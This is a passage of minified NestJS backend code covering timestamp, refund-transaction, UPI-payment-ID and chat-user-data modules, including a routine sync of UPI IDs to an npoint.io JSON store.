t=e?60*e*1e3:18e4;return this.timestampService.getClientsWithTimeDifference(t)}async update(e){return this.timestampService.update(e)}};t.TimestampController=l,n([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get timestamp data"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],l.prototype,"findOne",null),n([(0,a.Get)("stalled"),(0,s.ApiOperation)({summary:"Get clients with time differences greater than threshold"}),(0,s.ApiQuery)({name:"threshold",type:Number,required:!1,description:"Minimum time difference in minutes (default: 3)"}),r(0,(0,a.Query)("threshold")),o("design:type",Function),o("design:paramtypes",[Number]),o("design:returntype",Promise)],l.prototype,"getClientsWithTimeDifference",null),n([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update timestamp data"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],l.prototype,"update",null),t.TimestampController=l=n([(0,s.ApiTags)("Timestamps"),(0,a.Controller)("timestamps"),o("design:paramtypes",[c.TimestampService])],l)},1977:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.TimestampModule=void 0;const o=i(3563),r=i(5839),a=i(9642),s=i(2841),c=i(4317),l=i(8009);let p=class{};t.TimestampModule=p,t.TimestampModule=p=n([(0,o.Global)(),(0,o.Module)({imports:[r.MongooseModule.forFeature([{name:"timestampModule",collection:"timestamps",schema:c.TimestampSchema}]),l.ClientModule],providers:[a.TimestampService],controllers:[s.TimestampController],exports:[a.TimestampService]})],p)},9642:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TimestampService=void 0;const a=i(3563),s=i(5839),c=i(6037),l=i(5562);let p=class{constructor(e,t){this.timestampModel=e,this.clientService=t}async findOne(){const e=await this.timestampModel.findOne({}).lean().exec();if(!e)throw new a.NotFoundException("Timestamp not found");return e._id&&delete e._id,e}async getTimeDifferences(e=18e4){const t=await this.timestampModel.findOne({}).lean().exec();if(!t)throw new a.NotFoundException("Timestamp not found");const i=Date.now(),n={};return Object.keys(t).forEach((o=>{if("_id"===o||"number"!=typeof t[o])return;const r=i-t[o];r>e?n[o]=r:console.log(`Difference for ${o} is within the threshold: ${r}ms`)})),n}async getClientsWithTimeDifference(e=18e4){const t=await this.getTimeDifferences(e),i=Object.keys(t);if(0===i.length)return[];const n=[];for(const e of i){const t=e.split("_");try{const e=await this.clientService.findOne(t[0],!1);e&&(t[1]?n.push(e.promoteRepl):n.push(e.repl))}catch(t){console.error(`Error fetching client with ID ${e}:`,t.message)}}return n}async update(e){delete e._id;const t=await this.timestampModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0,lean:!0}).exec();if(!t)throw new a.NotFoundException("Timestamp not found");return t._id&&delete t._id,t}};t.TimestampService=p,t.TimestampService=p=n([(0,a.Injectable)(),r(0,(0,s.InjectModel)("timestampModule")),r(1,(0,a.Inject)((0,a.forwardRef)((()=>l.ClientService)))),o("design:paramtypes",[c.Model,l.ClientService])],p)},4317:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.TimestampSchema=t.Timestamp=void 0;const r=i(5839),a=o(i(6037));let s=class{};t.Timestamp=s,t.Timestamp=s=n([(0,r.Schema)({versionKey:!1,autoIndex:!0,strict:!1,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],s),t.TimestampSchema=r.SchemaFactory.createForClass(s),t.TimestampSchema.add({type:a.default.Schema.Types.Mixed})},2455:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateTransactionDto=t.TransactionStatus=void 0;const r=i(9742),a=i(7403),s=i(4922);var c;!function(e){e.PENDING="pending",e.COMPLETED="completed",e.FAILED="failed",e.CANCELLED="cancelled"}(c||(t.TransactionStatus=c={}));class l{constructor(){this.profile="undefined",this.chatId="undefined",this.ip="undefined",this.status=c.PENDING}}t.CreateTransactionDto=l,n([(0,r.ApiProperty)({description:"Unique transaction ID (UTR)",example:"TXN123456789",minLength:8}),(0,a.IsString)(),(0,a.IsNotEmpty)(),(0,a.MinLength)(8),(0,s.Transform)((({value:e})=>"string"==typeof e?e.toLowerCase():e)),o("design:type",String)],l.prototype,"transactionId",void 0),n([(0,r.ApiProperty)({description:"Amount involved in the transaction",example:100.5,minimum:0}),(0,a.IsNumber)(),(0,a.Min)(0),(0,s.Transform)((({value:e})=>parseFloat(e))),o("design:type",Number)],l.prototype,"amount",void 0),n([(0,r.ApiProperty)({description:"Issue type reported by the user",example:"payment_failed"}),(0,a.IsString)(),(0,a.IsNotEmpty)(),o("design:type",String)],l.prototype,"issue",void 0),n([(0,r.ApiProperty)({description:"Description of issue reported by the user",example:"Payment failed due to network error"}),(0,a.IsString)(),(0,a.IsNotEmpty)(),o("design:type",String)],l.prototype,"description",void 0),n([(0,r.ApiPropertyOptional)({description:"Refund method selected by the user",example:"bank_transfer",required:!1}),(0,a.IsString)(),(0,a.IsOptional)(),o("design:type",String)],l.prototype,"refundMethod",void 0),n([(0,r.ApiPropertyOptional)({description:"User profile ID",example:"user123",required:!1}),(0,a.IsString)(),(0,a.IsOptional)(),o("design:type",String)],l.prototype,"profile",void 0),n([(0,r.ApiPropertyOptional)({description:"User chat ID",example:"chat123",required:!1}),(0,a.IsString)(),(0,a.IsOptional)(),o("design:type",String)],l.prototype,"chatId",void 0),n([(0,r.ApiPropertyOptional)({description:"IP address of the user",example:"192.168.1.1",required:!1}),(0,a.IsString)(),(0,a.IsOptional)(),o("design:type",String)],l.prototype,"ip",void 0),n([(0,r.ApiPropertyOptional)({description:"Transaction status",enum:c,default:c.PENDING,required:!1}),(0,a.IsEnum)(c),(0,a.IsOptional)(),o("design:type",String)],l.prototype,"status",void 0)},470:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateTransactionDto=void 0;const n=i(9742),o=i(2455);class r extends((0,n.PartialType)(o.CreateTransactionDto)){}t.UpdateTransactionDto=r},2763:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.TransactionSchema=t.Transaction=void 0;const r=i(5839),a=i(6037),s=i(9742),c=i(2455);let l=class{};t.Transaction=l,n([(0,s.ApiProperty)({description:"Unique transaction ID (UTR)"}),(0,r.Prop)({type:a.Schema.Types.String,required:!0,unique:!0,index:!0}),o("design:type",String)],l.prototype,"transactionId",void 0),n([(0,s.ApiProperty)({description:"Amount involved in the transaction"}),(0,r.Prop)({type:a.Schema.Types.Number,required:!0,min:0}),o("design:type",Number)],l.prototype,"amount",void 0),n([(0,s.ApiProperty)({description:"Issue type reported by the user"}),(0,r.Prop)({type:a.Schema.Types.String,required:!0,index:!0}),o("design:type",String)],l.prototype,"issue",void 0),n([(0,s.ApiProperty)({description:"Description of issue reported by the user"}),(0,r.Prop)({type:a.Schema.Types.String,required:!0}),o("design:type",String)],l.prototype,"description",void 0),n([(0,s.ApiProperty)({description:"Refund method selected by the user"}),(0,r.Prop)({type:a.Schema.Types.String,default:"undefined",index:!0}),o("design:type",String)],l.prototype,"refundMethod",void 0),n([(0,s.ApiProperty)({description:"User profile ID"}),(0,r.Prop)({type:a.Schema.Types.String,default:"undefined",index:!0}),o("design:type",String)],l.prototype,"profile",void 0),n([(0,s.ApiProperty)({description:"User chat ID"}),(0,r.Prop)({type:a.Schema.Types.String,default:"undefined",index:!0}),o("design:type",String)],l.prototype,"chatId",void 0),n([(0,s.ApiProperty)({description:"IP address of the user"}),(0,r.Prop)({type:a.Schema.Types.String,default:"undefined"}),o("design:type",String)],l.prototype,"ip",void 0),n([(0,s.ApiProperty)({description:"Transaction status",enum:c.TransactionStatus,default:c.TransactionStatus.PENDING}),(0,r.Prop)({type:a.Schema.Types.String,enum:Object.values(c.TransactionStatus),default:c.TransactionStatus.PENDING,index:!0}),o("design:type",String)],l.prototype,"status",void 0),n([(0,s.ApiProperty)({description:"Creation timestamp"}),(0,r.Prop)({type:Date}),o("design:type",Date)],l.prototype,"createdAt",void 0),n([(0,s.ApiProperty)({description:"Last update timestamp"}),(0,r.Prop)({type:Date}),o("design:type",Date)],l.prototype,"updatedAt",void 0),t.Transaction=l=n([(0,r.Schema)({collection:"transactions",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>(t.id=t._id,delete t._id,t)}})],l),t.TransactionSchema=r.SchemaFactory.createForClass(l),t.TransactionSchema.index({chatId:1,status:1}),t.TransactionSchema.index({profile:1,status:1}),t.TransactionSchema.index({createdAt:-1}),t.TransactionSchema.index({amount:1,status:1})},8861:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TransactionController=void 0;const a=i(3563),s=i(9742),c=i(2455),l=i(470),p=i(2630),d=i(2763);let u=class{constructor(e){this.transactionService=e}async create(e){return this.transactionService.create(e)}async findOne(e){return this.transactionService.findOne(e)}async findAll(e,t,i,n,o,r,a,s,c,l){return this.transactionService.findAll({transactionId:e,amount:t,issue:i,refundMethod:n,profile:o,chatId:r,status:s,ip:a},c,l)}async update(e,t){return this.transactionService.update(e,t)}async delete(e){return this.transactionService.delete(e)}};t.TransactionController=u,n([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create a new transaction",description:"Creates a new transaction record with the provided details"}),(0,s.ApiResponse)({status:a.HttpStatus.CREATED,description:"Transaction created successfully.",type:d.Transaction}),(0,s.ApiResponse)({status:a.HttpStatus.BAD_REQUEST,description:"Invalid input data provided."}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[c.CreateTransactionDto]),o("design:returntype",Promise)],u.prototype,"create",null),n([(0,a.Get)(":id"),(0,s.ApiOperation)({summary:"Get transaction by ID",description:"Retrieves a specific transaction by its unique identifier"}),(0,s.ApiParam)({name:"id",description:"Transaction unique identifier",required:!0}),(0,s.ApiResponse)({status:a.HttpStatus.OK,description:"Transaction retrieved successfully.",type:d.Transaction}),(0,s.ApiResponse)({status:a.HttpStatus.NOT_FOUND,description:"Transaction not found."}),r(0,(0,a.Param)("id")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"findOne",null),n([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all transactions",description:"Retrieves all transactions with optional filtering, pagination and sorting"}),(0,s.ApiResponse)({status:a.HttpStatus.OK,description:"Transactions retrieved successfully.",type:[d.Transaction]}),(0,s.ApiQuery)({name:"transactionId",required:!1,description:"Filter by transaction ID (UTR)"}),(0,s.ApiQuery)({name:"amount",required:!1,type:"number",description:"Filter by transaction amount"}),(0,s.ApiQuery)({name:"issue",required:!1,description:"Filter by issue type"}),(0,s.ApiQuery)({name:"refundMethod",required:!1,description:"Filter by refund method"}),(0,s.ApiQuery)({name:"profile",required:!1,description:"Filter by user profile"}),(0,s.ApiQuery)({name:"chatId",required:!1,description:"Filter by chat ID"}),(0,s.ApiQuery)({name:"ip",required:!1,description:"Filter by IP address"}),(0,s.ApiQuery)({name:"status",required:!1,description:"Filter by transaction status"}),(0,s.ApiQuery)({name:"limit",required:!1,type:"number",description:"Number of records to return",example:10}),(0,s.ApiQuery)({name:"offset",required:!1,type:"number",description:"Number of records to skip",example:0}),r(0,(0,a.Query)("transactionId")),r(1,(0,a.Query)("amount")),r(2,(0,a.Query)("issue")),r(3,(0,a.Query)("refundMethod")),r(4,(0,a.Query)("profile")),r(5,(0,a.Query)("chatId")),r(6,(0,a.Query)("ip")),r(7,(0,a.Query)("status")),r(8,(0,a.Query)("limit")),r(9,(0,a.Query)("offset")),o("design:type",Function),o("design:paramtypes",[String,Number,String,String,String,String,String,String,Number,Number]),o("design:returntype",Promise)],u.prototype,"findAll",null),n([(0,a.Put)(":id"),(0,s.ApiOperation)({summary:"Update a transaction",description:"Updates an existing transaction by its unique identifier"}),(0,s.ApiParam)({name:"id",description:"Transaction unique identifier",required:!0}),(0,s.ApiResponse)({status:a.HttpStatus.OK,description:"Transaction updated successfully.",type:d.Transaction}),(0,s.ApiResponse)({status:a.HttpStatus.NOT_FOUND,description:"Transaction not found."}),(0,s.ApiResponse)({status:a.HttpStatus.BAD_REQUEST,description:"Invalid input data provided."}),r(0,(0,a.Param)("id")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,l.UpdateTransactionDto]),o("design:returntype",Promise)],u.prototype,"update",null),n([(0,a.Delete)(":id"),(0,s.ApiOperation)({summary:"Delete a transaction",description:"Deletes a transaction by its unique identifier"}),(0,s.ApiParam)({name:"id",description:"Transaction unique identifier",required:!0}),(0,s.ApiResponse)({status:a.HttpStatus.OK,description:"Transaction deleted successfully.",type:d.Transaction}),(0,s.ApiResponse)({status:a.HttpStatus.NOT_FOUND,description:"Transaction not found."}),r(0,(0,a.Param)("id")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"delete",null),t.TransactionController=u=n([(0,s.ApiTags)("Transactions"),(0,a.Controller)("transactions"),o("design:paramtypes",[p.TransactionService])],u)},9605:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.TransactionModule=void 0;const o=i(3563),r=i(5839),a=i(2630),s=i(8861),c=i(2763),l=i(5774);let p=class{};t.TransactionModule=p,t.TransactionModule=p=n([(0,o.Module)({imports:[l.initModule,r.MongooseModule.forFeature([{name:c.Transaction.name,schema:c.TransactionSchema}])],controllers:[s.TransactionController],providers:[a.TransactionService],exports:[a.TransactionService]})],p)},2630:function(e,t,i){var n,o=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},a=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TransactionService=void 0;const s=i(3563),c=i(5839),l=i(6037),p=i(2763),d=i(9647),u=i(6250);let m=n=class{constructor(e){this.transactionModel=e,this.logger=new s.Logger(n.name)}async create(e){this.logger.log(`Creating new transaction: ${JSON.stringify(e)}`);try{if(await this.transactionModel.findOne({transactionId:e.transactionId}).exec())throw new s.BadRequestException("Transaction with this ID already exists");const t=new this.transactionModel(e),i=await t.save();return this.logger.log(`Transaction created successfully: ${i.transactionId}`),i}catch(e){throw this.logger.error(`Error creating transaction: ${e.message}`,e.stack),e instanceof s.BadRequestException?e:new s.BadRequestException("Failed to create transaction")}}async findOne(e){this.logger.debug(`Finding transaction by ID: ${e}`);try{const t=await this.transactionModel.findById(e).exec();if(!t)throw this.logger.warn(`Transaction not found with ID: ${e}`),new s.NotFoundException("Transaction not found");return t}catch(e){if(this.logger.error(`Error finding transaction: ${e.message}`,e.stack),e instanceof s.NotFoundException)throw e;throw new s.BadRequestException("Invalid transaction ID format")}}async findAll(e,t=10,i=0){this.logger.debug(`Finding transactions with filters: ${JSON.stringify(e)}`);try{let n={},o=[],r=0;if(e.transactionId){const n={$or:[{transactionId:e.transactionId.toLowerCase()}]};if((0,l.isValidObjectId)(e.transactionId)&&n.$or.push({_id:e.transactionId}),[o,r]=await Promise.all([this.transactionModel.find(n).sort({createdAt:-1}).skip(i).limit(t).exec(),this.transactionModel.countDocuments(n).exec()]),r>0)return this.logger.debug(`Found ${r} transactions matching transactionId: ${e.transactionId}`),await this.sendNotification(e,r),{transactions:o,total:r}}if(e.ip&&(n={ip:e.ip},[o,r]=await Promise.all([this.transactionModel.find(n).sort({createdAt:-1}).skip(i).limit(t).exec(),this.transactionModel.countDocuments(n).exec()]),r>0))return this.logger.debug(`Found ${r} transactions matching ip: ${e.ip}`),await this.sendNotification(e,r),{transactions:o,total:r};if(e.chatId&&(n={chatId:e.chatId},[o,r]=await Promise.all([this.transactionModel.find(n).sort({createdAt:-1}).skip(i).limit(t).exec(),this.transactionModel.countDocuments(n).exec()]),r>0))return this.logger.debug(`Found ${r} transactions matching chatId: ${e.chatId}`),await this.sendNotification(e,r),{transactions:o,total:r};const a={};return e.profile&&(a.profile=e.profile),e.amount&&(a.amount=e.amount),e.issue&&(a.issue=e.issue),e.refundMethod&&(a.refundMethod=e.refundMethod),e.status&&(a.status=e.status),Object.keys(a).length>0&&(n=a,[o,r]=await Promise.all([this.transactionModel.find(n).sort({createdAt:-1}).skip(i).limit(t).exec(),this.transactionModel.countDocuments(n).exec()])),this.logger.debug(`Found ${r} transactions matching remaining filters`),await this.sendNotification(e,r),{transactions:o,total:r}}catch(e){throw this.logger.error(`Error finding transactions: ${e.message}`,e.stack),new s.BadRequestException("Failed to fetch transactions")}}async sendNotification(e,t){try{await(0,d.fetchWithTimeout)(`${(0,u.notifbot)(process.env.accountsChannel)}&text=${encodeURIComponent(`Found ${t} transactions matching ip: ${e.ip||"N/A"}\nchatId: ${e.chatId||"N/A"}\ntransactionId: ${e.transactionId||"N/A"}\nprofile: ${e.profile||"N/A"}`)}`)}catch(e){this.logger.error(`Failed to send notification: ${e.message}`)}}async update(e,t){this.logger.debug(`Updating transaction ${e} with data: ${JSON.stringify(t)}`);try{const i=await this.transactionModel.findByIdAndUpdate(e,t,{new:!0,runValidators:!0}).exec();if(!i)throw this.logger.warn(`Transaction not found for update with ID: ${e}`),new s.NotFoundException("Transaction not found");return this.logger.log(`Transaction ${e} updated successfully`),i}catch(e){if(this.logger.error(`Error updating transaction: ${e.message}`,e.stack),e instanceof s.NotFoundException)throw e;throw new s.BadRequestException("Failed to update transaction")}}async delete(e){this.logger.debug(`Deleting transaction: ${e}`);try{const t=await this.transactionModel.findByIdAndDelete(e).exec();if(!t)throw this.logger.warn(`Transaction not found for deletion with ID: ${e}`),new s.NotFoundException("Transaction not found");return this.logger.log(`Transaction ${e} deleted successfully`),t}catch(e){if(this.logger.error(`Error deleting transaction: ${e.message}`,e.stack),e instanceof s.NotFoundException)throw e;throw new s.BadRequestException("Failed to delete transaction")}}};t.TransactionService=m,t.TransactionService=m=n=o([(0,s.Injectable)(),a(0,(0,c.InjectModel)(p.Transaction.name)),r("design:paramtypes",[l.Model])],m)},4890:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UpiIdController=void 0;const a=i(3563),s=i(9742),c=i(7579);let l=class{constructor(e){this.UpiIdService=e}async findOne(){return this.UpiIdService.findOne()}async update(e){return this.UpiIdService.update(e)}};t.UpiIdController=l,n([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get Upi Ids"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],l.prototype,"findOne",null),n([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update Upi Ids"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],l.prototype,"update",null),t.UpiIdController=l=n([(0,s.ApiTags)("UPI Ids"),(0,a.Controller)("upi-ids"),o("design:paramtypes",[c.UpiIdService])],l)},7106:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.UpiIdModule=void 0;const o=i(3563),r=i(5839),a=i(7579),s=i(4890),c=i(5793),l=i(889);let p=class{};t.UpiIdModule=p,t.UpiIdModule=p=n([(0,o.Global)(),(0,o.Module)({imports:[p,l.NpointModule,r.MongooseModule.forFeature([{name:"UpiIdModule",collection:"upi-ids",schema:c.UpiIdSchema}])],providers:[a.UpiIdService],controllers:[s.UpiIdController],exports:[a.UpiIdService]})],p)},5793:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.UpiIdSchema=t.UpiId=void 0;const r=i(5839),a=o(i(6037));let s=class{};t.UpiId=s,t.UpiId=s=n([(0,r.Schema)({versionKey:!1,autoIndex:!0,timestamps:!1,toJSON:{virtuals:!1,transform:(e,t)=>{delete t._id}}})],s),t.UpiIdSchema=r.SchemaFactory.createForClass(s),t.UpiIdSchema.add({type:a.default.Schema.Types.Mixed})},7579:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}},a=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.UpiIdService=void 0;const s=i(3563),c=i(5839),l=i(6037),p=a(i(8938)),d=i(6185),u=i(6954);let m=class{constructor(e,t){this.UpiIdModel=e,this.npointSerive=t,this.upiIds={},this.findOne().then((()=>{setInterval((async()=>{await this.refreshUPIs(),await this.checkNpoint()}),3e5)}))}async OnModuleInit(){console.log("Config Module Inited")}async refreshUPIs(){console.log("Refreshing UPIs");const e=await this.UpiIdModel.findOne({}).lean().exec();e&&(this.upiIds=e)}async checkNpoint(){const e=(await p.default.get("https://api.npoint.io/54baf762fd873c55c6b1")).data,t=await this.findOne();(0,d.areJsonsNotSame)(e,t)&&await this.npointSerive.updateDocument("54baf762fd873c55c6b1",t)}async findOne(){if(Object.keys(this.upiIds).length>0)return this.upiIds;const e=await this.UpiIdModel.findOne({}).lean().exec();return e?(this.upiIds=e,console.log("Refreshed UPIs"),e):null}async update(e){delete e._id;const t=await this.UpiIdModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0,lean:!0}).exec();if(!t)throw new s.NotFoundException("UpiIdModel not found");return this.upiIds=t,console.log("Refreshed UPIs"),t}};t.UpiIdService=m,t.UpiIdService=m=n([(0,s.Injectable)(),r(0,(0,c.InjectModel)("UpiIdModule")),o("design:paramtypes",[l.Model,u.NpointService])],m)},2932:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateUserDataDto=void 0;const r=i(9742);class a{}t.CreateUserDataDto=a,n([(0,r.ApiProperty)({example:"5787751360",description:"Chat ID"}),o("design:type",String)],a.prototype,"chatId",void 0),n([(0,r.ApiProperty)({example:1,description:"Total count"}),o("design:type",Number)],a.prototype,"totalCount",void 0),n([(0,r.ApiProperty)({example:0,description:"Picture count"}),o("design:type",Number)],a.prototype,"picCount",void 0),n([(0,r.ApiProperty)({example:1718802722566,description:"Last message timestamp"}),o("design:type",Number)],a.prototype,"lastMsgTimeStamp",void 0),n([(0,r.ApiProperty)({example:1718802742567,description:"Limit time"}),o("design:type",Number)],a.prototype,"limitTime",void 0),n([(0,r.ApiProperty)({example:0,description:"Paid count"}),o("design:type",Number)],a.prototype,"paidCount",void 0),n([(0,r.ApiProperty)({example:0,description:"Profile count"}),o("design:type",Number)],a.prototype,"prfCount",void 0),n([(0,r.ApiProperty)({example:1,description:"Can reply"}),o("design:type",Number)],a.prototype,"canReply",void 0),n([(0,r.ApiProperty)({example:0,description:"Pay amount"}),o("design:type",Number)],a.prototype,"payAmount",void 0),n([(0,r.ApiProperty)({example:0,description:"highestPayAmount"}),o("design:type",Number)],a.prototype,"highestPayAmount",void 0),n([(0,r.ApiProperty)({example:0,description:"cheatCount",default:0}),o("design:type",Number)],a.prototype,"cheatCount",void 0),n([(0,r.ApiProperty)({example:0,description:"callTime",default:0}),o("design:type",Number)],a.prototype,"callTime",void 0),n([(0,r.ApiProperty)({example:"بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅",description:"Username"}),o("design:type",String)],a.prototype,"username",void 0),n([(0,r.ApiProperty)({example:"-7250939091939055173",description:"Access hash"}),o("design:type",String)],a.prototype,"accessHash",void 0),n([(0,r.ApiProperty)({example:!0,description:"Paid reply status"}),o("design:type",Boolean)],a.prototype,"paidReply",void 0),n([(0,r.ApiProperty)({example:!1,description:"Demo given 